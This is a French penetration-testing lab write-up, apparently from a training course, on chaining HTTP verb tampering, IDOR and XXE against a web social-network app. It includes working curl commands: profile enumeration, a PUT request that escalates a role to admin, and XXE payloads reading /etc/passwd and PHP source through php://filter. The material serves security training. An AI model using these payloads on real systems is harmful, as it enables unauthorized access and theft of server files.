# Lab - Attaques web combinées

Un test d'intrusion sur une application web de réseau social développée en interne. L'objectif est de combiner les trois familles d'attaques vues dans ce module (HTTP Verb Tampering, IDOR, XXE) pour escalader les privilèges et accéder à des données sensibles sur le serveur.

## Scénario

On intervient pour une entreprise de développement logiciel qui souhaite faire auditer la dernière version de son application de réseau social. L'application dispose de fonctionnalités classiques : profils utilisateurs, gestion de fichiers, formulaires de contact, et une API REST pour les interactions back-end.

L'accès initial se fait avec un compte utilisateur standard. L'objectif est de démontrer qu'un utilisateur peu privilégié peut escalader ses droits et compromettre la confidentialité des données hébergées sur le serveur. Le périmètre couvre les trois types de vulnérabilités étudiés dans ce module.

## Approche

La méthodologie consiste à explorer chaque surface d'attaque de manière systématique, en enchaînant les vulnérabilités découvertes :

1. **Reconnaissance de l'application** : identifier les formulaires, endpoints API, et fonctionnalités disponibles. Observer les requêtes HTTP dans Burp pour repérer les paramètres manipulables
2. **Tester le Verb Tampering** : sur chaque endpoint protégé, vérifier si le contrôle d'accès couvre toutes les méthodes HTTP. Un endpoint qui rejette GET peut accepter POST, HEAD ou PUT
3. **Chercher les IDOR** : examiner les identifiants dans les URLs et les corps de requête. Tester l'incrémentation, le changement de rôle, l'accès aux profils d'autres utilisateurs via l'API
4. **Tester les injections XXE** : identifier les fonctionnalités qui acceptent du XML (formulaires, imports, APIs SOAP). Injecter une entité interne pour confirmer le parsing, puis tenter la lecture de fichiers
5. **Chaîner les vulnérabilités** : une fuite d'information IDOR peut révéler un UUID nécessaire pour modifier un profil. Un contournement Verb Tampering peut donner accès à une fonctionnalité vulnérable au XXE

{% hint style="success" %}
En audit réel, documenter chaque étape de la chaîne d'attaque est aussi important que l'exploitation elle-même. Le rapport doit montrer comment des vulnérabilités individuellement modérées se combinent pour produire un impact critique.
{% endhint %}

## Commandes

```bash
# - Tester les méthodes HTTP acceptées sur un endpoint
curl -i -X OPTIONS "http://<IP_CIBLE>:<PORT>/"

# - Tester un changement de méthode HTTP
curl -X HEAD -i "http://<IP_CIBLE>:<PORT>/admin/page.php"
curl -X POST -d "" "http://<IP_CIBLE>:<PORT>/admin/page.php"

# - Énumérer les profils via l'API (IDOR)
for i in $(seq 1 20); do
    echo "=== UID $i ==="
    curl -s "http://<IP_CIBLE>:<PORT>/api/profile/$i" | jq .
done

# - Modifier un profil via PUT (IDOR insecure function call)
curl -s -X PUT "http://<IP_CIBLE>:<PORT>/api/profile/1" \
    -H "Content-Type: application/json" \
    -d '{"uid":1,"role":"admin","full_name":"test"}'

# - Tester une injection XXE basique
curl -s -X POST "http://<IP_CIBLE>:<PORT>/submit.php" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><email>&xxe;</email></root>'

# - Lire du code source PHP via XXE
curl -s -X POST "http://<IP_CIBLE>:<PORT>/submit.php" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<root><email>&xxe;</email></root>'
```

## Ce qu'on en retient

- Les vulnérabilités web fonctionnent rarement de manière isolée en conditions réelles. La valeur d'un pentest vient souvent de la capacité à enchaîner des failles de sévérité modérée pour obtenir un impact critique
- Un IDOR peut fournir les informations (UUID, rôle admin) nécessaires pour exploiter un Verb Tampering ou escalader les privilèges
- Un Verb Tampering peut donner accès à une fonctionnalité d'administration vulnérable au XXE
- Tester chaque vulnérabilité individuellement ne suffit pas. C'est la combinaison qui révèle le risque réel pour l'entreprise

{% hint style="info" %}
Ce type d'exercice reflète bien la réalité d'un audit applicatif. Les applications modernes présentent rarement une seule vulnérabilité critique en isolation. La capacité à identifier et exploiter des chaînes d'attaque est ce qui distingue un pentest superficiel d'un audit approfondi.
{% endhint %}

***
